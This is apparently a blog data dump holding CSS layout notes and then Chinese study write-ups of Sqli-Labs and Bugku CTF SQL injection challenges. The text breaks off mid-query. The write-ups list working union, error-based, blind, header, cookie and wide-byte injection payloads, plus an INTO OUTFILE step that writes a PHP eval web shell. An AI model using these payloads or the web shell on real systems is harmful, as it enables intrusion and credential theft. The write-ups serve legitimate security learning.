元素，并且随着页面滚动而移动。一个“positioned”元素是指 position 值不是 static 的元素。 display 值 描述 none 此元素不会被显示。 block 此元素将显示为块级元素，此元素前后会带有换行符。 inline 默认。此元素会被显示为内联元素，元素前后没有换行符。 inline-block 行内块元素。（CSS2.1 新增的值） list-item 此元素会作为列表显示。 run-in 此元素会根据上下文作为块级元素或内联元素显示。 table 此元素会作为块级表格来显示（类似 table），表格前后带有换行符。 inline-table 此元素会作为内联表格来显示（类似 table），表格前后没有换行符。 table-row-group 此元素会作为一个或多个行的分组来显示（类似 tbody）。 table-header-group 此元素会作为一个或多个行的分组来显示（类似 thead）。 table-footer-group 此元素会作为一个或多个行的分组来显示（类似 tfoot）。 table-row 此元素会作为一个表格行显示（类似 tr）。 table-column-group 此元素会作为一个或多个列的分组来显示（类似 colgroup）。 table-column 此元素会作为一个单元格列显示（类似 col） table-cell 此元素会作为一个表格单元格显示（类似 td 和 th） table-caption 此元素会作为一个表格标题显示（类似 caption） inherit 规定应该从父元素继承 display 属性的值。 还有一些有趣的display值戳这里 display 是CSS中最重要的用于控制布局的属性。每个元素都有一个默认的 display 值，这与元素的类型有关。对于大多数元素它们的默认值通常是 block 或 inline 。 常见的块级标签：div，p，form，ul，ol，h1~h6，table，dl，hr，address，fieldset，header，footer，section… 常见的行级标签：span，a，img，input，select，label，textarea，b或strong，i或em… float 值 描述 left 元素向左浮动。 right 元素向右浮动。 none 默认值。元素不浮动，并会显示在其在文本中出现的位置。 inherit 规定应该从父元素继承 float 属性的值。 float 属性定义元素在哪个方向浮动。以往这个属性总应用于图像，使文本围绕在图像周围，不过在 CSS 中，任何元素都可以浮动。浮动元素会生成一个块级框，而不论它本身是何种元素。 0x02弹性盒子–Flex Container附链接：阮一峰的flex布局教程 模型说明当元素表现为flex框时，他们沿着两个轴来布局： 主轴（main axis）是沿着flex元素放置的方向延伸的轴。该轴的开始和结束被称为main start和main end。 交叉轴（cross axis）是垂直于flex元素放置方向的轴。该轴的开始和结束被称为cross start和cross end。 设置了display：flex的元素被称为flex容器（flex container） 在flex容器中表现为柔性的盒子的元素被称为flex项。 容器属性flex-direction：用于指定主轴的方向 row：默认值，主轴为水平方向，起点在左端 row-reverse：主轴为水平方向，起点在右端 column：主轴为垂直方向，起点在上沿 column-reverse：主轴为垂直方向，起点在下沿 flex-wrap：用于定义换行方式 nowrap：（默认）不换行 wrap：换行，第一行在上方 wrap-reverse：换行，第一行在下方 flex-flow：flex-direction属性和flex-wrap属性的简写形式默认值为：row nowrap 。 justify-content：定义项目在主轴上的对齐方式。 flex-start：左对齐（默认值） flex-end：右对齐 center：居中 space-between：两端对齐，项目之间间隔相等 space-around：每个项目两侧的间隔相等 align-item：定义在交叉轴上的对齐方式 flex-start：交叉轴起点对齐 flex-end：交叉轴终点对齐 center：交叉轴中点对齐 stretch（默认值）：如果项目没有设置高度或设为auto，将占满整个容器的高度 baseline：项目的第一行文字的基线对齐 align-content：定义多轴线对齐方式如果项目只有一根轴线，该属性不起作用。 flex-start：与交叉轴起点对齐 flex-end：与交叉轴终点对齐 center：与交叉轴中点对齐 stretch：轴线占满整个交叉轴 space-between：与交叉轴两端对齐，轴线之间的间隔平均分布 space-around：每根轴线两侧的间隔都相等 项目属性order：定义项目的排列顺序数值越小，排列越靠前。 order: number; flex-grow：定义项目的放大比例默认值为0，即如果存在剩余空间，也不放大。 flex-grow: number; 如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）；如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。 flex-shrink：定义项目的缩小比例默认值为1，即如果空间不足，项目缩小。 flex-shrink: number; 如果所有项目的flex-shrink属性都为1，当空间不足时都等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时前者不缩小。 flex-basis定义在分配多余空间之前，项目占据的主轴空间。浏览器根据这个属性，计算主轴是否有多余空间。默认值为auto，即项目本来的大小。可以设置为跟width和height属性一样的值，即项目占据固定空间。 flex是flex-grow，flex-shrink和flex-basis的缩写，默认值为0，1，auto。 align-self允许单个项目有与其他项目不一样的对齐方式，可覆盖align-item值，默认为auto，表示继承父元素的align-item属性，如果没有父元素，则等同于stretch。 该属性可能取6个值，除了auto，其他都与align-items属性完全一致。 flex布局实例附flex实例教程 详见教程示例。 补充： flex属性是flex-grow、flex-shrink、flex-basis属性的简写，默认值为0 1 auto；设置 flex: 1; 表示所有子元素都有相同的长度，且忽略其内部的内容；设置 flex: auto; 相当于 flex:1 1 auto;，设置 flex: none; 相当于 flex: 0 0 auto;。 0x03基本居中布局 设置text-align: center;（水平居中，且只对行内元素和display为inline或inline-block的元素有效） 水平居中 行内元素水平居中text-align:center width:100px; margin:0 auto; 利用tabledisplay:table; margin:0 auto; 利用absolute+transform 12.parent&#123; position:relative; &#125;.child&#123; position:absolute; left:50%; tranform: translateX(-50%); &#125; 利用flex 12.parent&#123; display: flex; &#125;.child&#123; margin: 0 auto; &#125; 1.parent&#123; display:flex; justify-content:center; &#125; 垂直居中（除去使用absolute定位的一些其他方法） 使用flex+align-items 1234.parent&#123; display: flex; align-items: center;&#125; 使用table-cell+vertical-align 1234.parent&#123; display: table-cell; vaertical-align: middle;&#125; 单行内联元素垂直居中 1234#box&#123; height: 120px; line-height: 120px; /*把行高设成高度值*/&#125; 多行内联元素垂直居中 123456.parent&#123; height: 100px; display: flex; flex-direction: column; justify-content: center;&#125; 或者利用table表布局 12345678.parent&#123; display: table; height: 100px;&#125;.child&#123; display: table-cell; vertical-align: middle;&#125; 水平垂直居中对齐 使用绝对定位进行水平垂直居中 123456.parent&#123; position:relative; &#125;.child&#123; width:200px; height:100px; position:absolute; left:50%; top:50%; margin-left:-100px; margin-top:-50px; &#125;/*用translate与之类似*/.parent&#123; position:relative; &#125;.child&#123; width:200px; height:100px; position:absolute; left:50%; top:50%; transform(-50%,-50%); &#125; 另一种使用绝对定位的方法 12.parent&#123; position:relative; &#125;.child&#123; width:100px; height:100px; position:absolute; left:0; right:0; top:0; bottom:0; margin:auto; &#125; 如果改变left，right , top , bottom的值可以让元素向某个方向偏移。 绝对定位+CSS3（未知高度） 1234567.parent&#123; position:relative; &#125;.child&#123; position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);&#125; 用table-cell实现 123456.parent&#123; display: table;&#125;.child&#123; display:table-cell; vertical-align: middle; text-align: center;&#125; 一个神奇的水平居中方法（利用float，position和clear的结合） 1234567891011121314151617181920212223&lt;style&gt; .parent&#123; width:300px; height:200px; border:1px solid red; &#125; /*设置父容器*/ .wrapper&#123; /*自适应内容的宽度*/ float: left; position: relative; left: 50%; /*先让wrapper位于父容器宽度一半地方*/ clear: both; /*避免让后面的wrapper左浮动后与当前wrapper位于同一行*/ &#125; .child&#123; position: relative; /*在当前元素上进行相对定位*/ left: -50%; /*左移元素自身宽度的一半*/ white-space: nowrap; border: 1px solid blue; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"wrapper\"&gt; &lt;div class=\"child\"&gt;这是第一个尝试&lt;/div&gt; &lt;/div&gt; &lt;div class=\"wrapper\"&gt; &lt;div class=\"child\"&gt;再试试这个&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; flex实现 12345.parent&#123; display:flex; justify-content:center; /*横轴居中*/ align-items:center; /*纵轴居中*/&#125; flex/grid与marign:auto 1234567.parent&#123; height: 100vh; /*必须有高度*/ display: grid; /*或设成flex*/&#125;.child&#123; margin: auto;&#125; 0x04多列布局参考链接 左列定宽，右列自适应float+margin-left实现12.left&#123; float:left; width:100px; &#125;.right&#123; margin-left:100px; &#125; float+overflow实现12.left&#123; width:100px; float:left;&#125;.right&#123; overflow:hidden; &#125; 设置right-fix盒子1234567891011&lt;style&gt; .left&#123; width:100px; float:left; &#125; .right-fix&#123; width:100%; margin-left:-100px; float:right; &#125; .right&#123; margin-left:100px; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"left\"&gt;&lt;/div&gt; &lt;div class=\"right-fix\"&gt; &lt;div class=\"right\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 使用table实现123.parent&#123; display:table; table-layout:fixed; width:100%; &#125;.left&#123; width:100px; &#125;.right,.left&#123; display:table-cell; &#125; 使用flex实现123.parent&#123; display:flex; &#125;.left&#123; width:100px; &#125;.right&#123; flex:1; &#125; /*直接填补右侧空余宽度*/ 右列定宽，左列自适应float+margin实现12.left&#123; float:left; width:100%; margin-right:-100px; &#125;.right&#123; float:right; width:100px; &#125; 使用table实现123.parent&#123; display:table; table-layout:fixed; width:100%; &#125;.left&#123; display:table-cell; &#125;.right&#123; width:100px; display:table-cell; &#125; 使用flex实现123.parent&#123; display:flex; &#125;.left&#123; flex:1; &#125;.right&#123; width:100px; &#125; 两侧定宽，中间栏自适应float+margin实现（有异议）123.left&#123; width：100px; float:left; &#125;.center&#123; float:left; width:100%; margin-right:-200px; &#125;.right&#123; width:100px; float:right; &#125; 用table实现123.parent&#123; width:100%; display:table; table-layout:fixed &#125;.left,.middle,.right&#123; display:table-cell; &#125;.left,.right&#123; width:100px; &#125; 用flex实现123.parent&#123; display:flex; &#125;.left,.right&#123; width:100px; &#125;.middle&#123; flex:1; &#125; 一列不定宽，一列自适应float+overflow实现12.left&#123; float:left; &#125;.right&#123; overflow:hidden; &#125; 用flex实现12.parent&#123; display:flex; &#125;.right&#123; flex:1; &#125; 多列等分布局float实现123456789&lt;style&gt; .parent&#123; margin-left:-20px &#125; /*假设列之间的间距为20px*/ .column&#123; float:left; width:25%; box-sizing:border-box; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"column\"&gt;1&lt;/div&gt; &lt;div class=\"column\"&gt;2&lt;/div&gt; &lt;div class=\"column\"&gt;3&lt;/div&gt;&lt;/div&gt; flex实现1234567.parent&#123; display:flex; &#125;.column&#123; flex:1; &#125;.column+.column&#123; margin-left:20px; &#125;/*另一种确定column宽度的情况*/.parent&#123; display:flex; justify-content:space-between; &#125;.column&#123; width:350px; &#125; 0x05响应式布局参考资料","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"}]},{"title":"Sqli-Labs Study","slug":"Sqli-Labs-Study","date":"2018-08-31T04:14:22.000Z","updated":"2018-09-09T05:55:16.704Z","comments":true,"path":"2018/08/31/Sqli-Labs-Study/","link":"","permalink":"http://yoursite.com/2018/08/31/Sqli-Labs-Study/","excerpt":"","text":"Sqli-Labs注入学习笔记环境搭建 Ubuntu16.04+apache2+php5.6+mysql5.7 关于平台搭建的相关教程戳这里 搭建完成后进入localhost/sqli-labs-master，点链接看到map 再点Less-1，如果出现如下页面说明数据也已搭建完毕。 现在可以开始进行注入的学习了 Page-1(Basic Challenges)Less-1 GET-Error based-Single quotes-String localhost/sqli-labs-master/Less-1/?id=1&#39;出现报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 发现已经闭合，直接加注释符即可注入。 ?id=1&#39; order by 2--+，?id=1&#39; order by 3--+均正常回显，order by 4报错，说明有三列。 ?id=-1&#39; union select database(),2,3--+发现回显为在2,3处，?id=-1&#39; union select 1,database(),3--+得库名security ?id=-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&quot;security&quot; limit 0,1--+改变limit范围共得到emails,referers,uagents,users四个表名。 还有一种更简单的办法：?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;--+同理得到id,username,password三个字段名。 ?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+得到十三组用户名密码。 12username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 Less-2 GET-Error based-integer based ?id=1&#39;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1 发现这个已经闭合过了，再加一个单引号就会多出来。 所以同理直接构造id=-1 union select 1,username,password from users limit 0,1--+ Less-3 GET-Error based-Single quotes with twist-String ?id=1&#39;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1 后面多了个括号。构造：?id=1&#39;) Less-4 GET-Error based-Double quotes-String ?id=1&#39;不报错，?id=1&quot;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1″”) LIMIT 0,1’ at line 1 构造：?id=1&quot;) Less-5 GET-Double injection-Single quotes-String ?id=1这次的页面和之前不太一样，没有出现回显位，所以不能像前几次那样构造了。 可以先看一下这篇博文：MYSQL注入天书之盲注讲解 ?id=1&#39;这里报错和Less-1里面的一样。 题目提示双注入：先了解一下 先查库名：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(database()),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+回显Duplicate entry &#39;~security~1&#39; for key&quot; 也可以用extravalue报错的方法：?id=-1&#39; and extravalue(1,concat(0x7e,(select database()),0x7e))--+回显FUNCTION security.extractvalue does not exist ?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+ 回显Duplicate entry &#39;~emails~0&#39; for key&quot; ?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+回显Duplicate entry &#39;~users~1&#39; for key&quot; 直接查四个表的方法：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select (group_concat(table_name)) from information_schema.tables where table_schema=&#39;security&#39;),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ 查users表列名：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select (group_concat(column_name)) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ 查数据：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ Less-6 GET-Double injection-Double quotes-String ?id=1&#39;不报错，?id=1&quot;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1 ，把Less-5的payload中的单引号换成双引号即可。 Less-7 GET-Dump into outfile-String 先了解一下dumpfile的用法 还有 SQL注入写入一句话木马原理 首先要获取网站在系统中的具体路径，利用@@datadir (数据库路径) 和@@basedir (MYSQL安装路径)。 在Less-1注入得到数据库路径/var/lib/mysql/，安装路径/usr/ 试了?id=1&#39;、?id=1&quot;、?id=1&#39;)都不行，去看了下源码，发现用的双括号 1234567891011121314151617$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You are in.... Use outfile......'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You have an error in your SQL syntax'; //print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125; ?id=-1&#39;)) union select 1,2,3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e into outfile &#39;/var/www/html/cmd.php&#39;--+ ，这里的3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e 是&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;的十六进制。最后再用菜刀连接。 Less-8 GET-Blind-Boolean based-Single quotes 基于布尔的盲注，可以借助substr()，left()，mid()等其他函数判断。 1.从左开始截取字符串：left(str, length)，即left(被截取字符串， 截取长度) 2.从右开始截取字符串：right(str, length)，即right(被截取字符串， 截取长度) 3.截取特定长度的字符串： substring(str, pos)，即：substring(被截取字符串， 从第几位开始截取) substring(str, pos, length)，即：substring(被截取字符串，从第几位开始截取，截取长度) 从字符串的倒数第6个字符开始读取，只取2个字符 1SELECT SUBSTRING(&apos;helloworld&apos;, -6, 2) 4.按关键字进行读取：substring_index(str, delim, count)，即substring_index(被截取字符串，关键字，关键字出现的次数) 截取第二个“.”之前的所有字符 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, 2); 截取倒数第二个“.”之后的所有字符 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, -2); 如果关键字不存在，则返回整个字符串 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;#&apos;, 1); 试着查库名：?id=1&#39; and substr(database(),1,1)&gt;&#39;a&#39;--+，若回显you are in说明库名的第一个字符在a之后，然后手工一个一个试就能试出第一个字符是啥，同理就可以试出整个库名。当然这样试很麻烦，用脚本跑会快很多。 类似地，构造?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1)1,1)&gt;&#39;a&#39;--+可以试出表名。 或者利用ascii()和substr()函数构造：?id=1&#39; and ascii(substr((select database()),1,1))&gt;33--+ Less-9 GET-Blind-Time bases-Single quotes 基于时间的盲注：附链接 可以利用if()，sleep()，benchmark()函数进行盲注。 if(exp1,exp2,exp3)：当exp1为true时，执行exp2；否则执行exp3 sleep(seconds)：让代码执行延迟若干秒 benchmark(n,exp)：让表达式exp重复执行n次 查库名：?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+匹配的时候会直接返回，不匹配则需等待5秒。表名、列名、数据信息也可以通过这种方式查出。 Less-10 GET-Blind-Time based-Double quotes 将Less-9的payload里的单引号换成双引号即可。 Less-11 POST-Error based-Single quotes-String 变成post了，有俩输入框username和password，猜会用到万能密码。用户名输admin&#39;#密码随便填，回显用户admin登录，可以注入了 username：&#39; or 1=1 order by 2#回显正确，&#39; or 1=1 order by 3#报错，说明有两列 &#39; union select 1,database()#得库名 &#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;#得表名，查列名和数据同理。 （这里都是在username里注入，也可以利用已知的用户名admin在password里添加查询语句） Less-12 POST-Error based-Double quotes-String-with twist 这里构造方法和Less-11差不多，只需把单引号改成&quot;) Less-13 POST-Double injection-Single quotes-String-with twist 查库名：用户名输&#39; or &#39;1&#39;=&#39;1，密码输&#39;) or 1=1 and extractvalue(1,concat(0x7e,(select database()),0x7e))#，报错FUNCTION security.extractvalue does not exist 或者用户名输admin&#39;) and extractvalue(1,concat(0x7e,(select database()),0x7e))#，密码随便输，出现报错XPATH syntax error:&#39;~security~&#39; 查表名：用户名admin&#39;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),0x7e))#，报错XPATH syntax error:&#39;~emails,referers,uagents,users~&#39; 查列名和数据同理。 Less-14 POST-Double injection-Single quotes-String-with twist 和Less-13类似，把&#39;)&#39;换成&quot; Less-15 POST-Blind-Boolean/time Based-Single quotes 基于布尔：用户名admin&#39; and substr(database(),1,1)&gt;&#39;a&#39;# 基于时间：用户名admin&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))# Less-16 POST-Blind-Boolean/time Based-Double quotes 把Less-15里的单引号换成)&quot; 附源码 12345$uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); Less-17 POST-Update Query-Error based-String 关于Update Query：附链接 看下源码 1234567891011121314151617181920212223242526272829function check_input($value)&#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value;&#125;// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))&#123;//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd']; addslashes()：返回在预定义字符（’,”,\\,NULL）前添加反斜杠的字符串 stripslashes()：删除addslashes()添加的反斜杠 mysql_real_escape_string()：转义SQL语句中字符串的特殊字符 发现了一个过滤函数，并且会检查输入的username，所以这次只能在password处构造 uname=admin&amp;passwd=&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;submit=Submit 或者uname=admin&amp;passwd=&#39;or updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),0)#&amp;submit=Submit 查数据uname=admin&amp;passwd=&#39;or updatexml(1,concat(&#39;~&#39;,(select * from(select concat_ws(char(45),id,username,password)from users limit 0,1)as a),&#39;~&#39;),0)# Less-18 POST-Header injection-Uagent field-Error based 先看源码，贴一部分 123456789101112131415161718192021222324252627282930313233$uname = check_input($_POST['uname']);$passwd = check_input($_POST['passwd']);$sql=\"SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\"; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; echo \"&lt;/font&gt;\"; //echo \"&lt;br&gt;\"; echo '&lt;font color= \"#0000ff\" font size = 3 &gt;'; echo 'Your User Agent is: ' .$uagent; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; print_r(mysql_error()); echo \"&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;br&gt;\"; &#125; else &#123; echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; 这次在username和password处都对输入进行了过滤，但是往后看会发现$insert=&quot;INSERT INTO security.uagents (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, &#39;$uname&#39;)&quot;; mysql_query($insert);这里提供了新的注入点，可以在$uagent或$IP里加查询语句，uagent相对好修改，直接用火狐浏览器插件hackbar里POST。 UA：&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1 POST以后回显如图 Less-19 POST-Header injection-Referer field-Error based 和Less-18差不多，这次是修改referer。 Referer：&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1 Less-20 POST-Cookie injection-Uagent field-Error based 这里需要在Cookie中构造查询语句，可以借助火狐插件Cookie Quick Manager修改cookie值 先用admin身份登录一下会产生一个cookie，尝试修改成uname=admin&#39; order by 3#不报错，改成4报错，一共有三列。 接着构造uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#，回显如图 其他同理。 Less-21 POST-Dump into outfile-String 查看源码，发现了一些新东西 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364if(!isset($_POST['submit']))&#123; $cookee = $_COOKIE['uname']; $format = 'D d M Y - H:i:s'; $timestamp = time() + 3600; echo \"&lt;center&gt;\"; echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; echo '&lt;img src=\"../images/Less-21.jpg\" /&gt;'; echo \"&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; echo '&lt;br&gt;&lt;font color= \"red\" font size=\"4\"&gt;'; echo \"YOUR USER AGENT IS : \".$_SERVER['HTTP_USER_AGENT']; echo \"&lt;/font&gt;&lt;br&gt;\"; echo '&lt;font color= \"cyan\" font size=\"4\"&gt;'; echo \"YOUR IP ADDRESS IS : \".$_SERVER['REMOTE_ADDR']; echo \"&lt;/font&gt;&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4 &gt;'; echo \"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;\"; echo '&lt;font color= \"orange\" font size = 5 &gt;'; echo \"YOUR COOKIE : uname = $cookee and expires: \" . date($format, $timestamp); $cookee = base64_decode($cookee); echo \"&lt;br&gt;&lt;/font&gt;\"; $sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\"; $result=mysql_query($sql); if (!$result) &#123; die('Issue with your mysql: ' . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"pink\" font size=\"5\"&gt;'; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo '&lt;font color= \"grey\" font size=\"5\"&gt;'; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;&lt;/b&gt;\"; echo \"&lt;br&gt;\"; echo 'Your ID:' .$row['id']; &#125; else &#123; echo \"&lt;center&gt;\"; echo '&lt;br&gt;&lt;br&gt;&lt;br&gt;'; echo '&lt;img src=\"../images/slap1.jpg\" /&gt;'; echo \"&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; //echo '&lt;img src=\"../images/Less-20.jpg\" /&gt;'; &#125; echo '&lt;center&gt;'; echo '&lt;form action=\"\" method=\"post\"&gt;'; echo '&lt;input type=\"submit\" name=\"submit\" value=\"Delete Your Cookie!\" /&gt;'; echo '&lt;/form&gt;'; echo '&lt;/center&gt;';&#125; else&#123; echo '&lt;center&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 6 &gt;'; echo \" Your Cookie is deleted\"; setcookie('uname', base64_encode($row1['username']), time()-3600); header ('Location: index.php'); echo '&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;';&#125; Less-22 Future editions","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://yoursite.com/tags/SQL/"}]},{"title":"Bugku SQL注入题目总结","slug":"Bugku-SQL注入题目总结","date":"2018-08-25T04:32:40.000Z","updated":"2018-09-09T03:09:50.319Z","comments":true,"path":"2018/08/25/Bugku-SQL注入题目总结/","link":"","permalink":"http://yoursite.com/2018/08/25/Bugku-SQL注入题目总结/","excerpt":"","text":"Bugku SQL注入题目总结sql注入查看源码发现网页编码为gb2312，猜测考的是宽字节注入。 关于宽字节注入可以参考大佬的详解：戳这里 果然输入?id=1%df&#39;出现了报错，说明已经可以注入了。1%df%27被转换成了1運，原因就是单引号前被添加了转义符\\，即%5c，在这里前面的%df和%5c结合形成了汉字，导致单引号成功逃逸。下面就可以直接操作了。 ?id=1%df&#39;and version()&gt;0 --+返回正确，说明数据库可能是sqlserver或者mysql ?id=1%bf&#39; and length(user())&gt;0 --+返回正确，说明存在user()函数，数据库为mysql ?id=1%df&#39; order by 2 --+正常回显，?id=1%df&#39; order by 3 --+报错，证明一共有两列 ?id=1%df&#39; union select database(),2 --+得数据库名sql5 已知表名为key，字段名为string，直接构造?id=1%df&#39; union select 1,string from sql5.key --+ SQL注入1题目过滤了关键字 1234567891011121314//过滤sql$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = \"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1\"; 但是往后看发现这句$id = strip_tags($id);，strip_tags() 函数可以剥去字符串中的 HTML、XML 以及 PHP 的标签，这样就可以利用&lt;&gt;绕过。 ?id=1 un&lt;&gt;ion sel&lt;&gt;ect 1,database()--+得数据库名sql3 根据已知条件构造?id=1 un&lt;&gt;ion sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key --+得flag 成绩单这里--+被过滤了，用#注释 试着输入0&#39; or 1=1 union select 1,2 #，0&#39;or 1=1 union select 1,2,3 #无回显，0&#39; or 1=1 union select 1,2,3,4 #正常显示 所以输入0&#39; union select database(),null,null,null #得数据库名skctf_flag 0&#39; union select table_name,2,3,4 from information_schema.tables where table_schema = &#39;skctf_flag&#39;#得表名fl4g 0&#39; union select column_name,2,3,4 from information_schema.columns where table_name=&#39;fl4g&#39; #得列名skctf_flag 最后一步0&#39; union select skctf_flag,2,3,4 from fl4g #得flag login1提示SQL约束攻击，这里可以先了解一下约束攻击什么意思，附链接：戳这里 大概意思是在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说”admin”等同于”admin “。例如以下语句的查询结果，与使用用户名”admin”进行查询时的结果是一样的。 SELECT * FROM users WHERE username=&#39;admin &#39;; 现在可以试着操作了。点进去是个登陆页面，还看到了注册链接。先随便注册一个然后登陆，显示不是管理员还想看flag？！。。想知道管理员用户名然后尝试注入发现没啥用，于是去注册页面试着以admin为用户名注册，页面提示admin已存在 。好的这下好办了，根据提示得SQL约束攻击，直接去注册一个账号用户名叫’admin ‘（admin后加空格），设置密码，再去登陆得flag。 这是一个神奇的登陆框试着输入发现单引号被过滤了，但是双引号没被过滤。 0&quot; or 1=1 order by 2 #正常回显，0&quot; or 1=1 order by 3 #显示错误，说明有两列。 0&quot; union select database(),null #得数据库名bugkusql1 0&quot; union select table_name,null from information_schema.tables where table_schema=&#39;bugkusql1&#39; #得表名flag1 0&quot; union 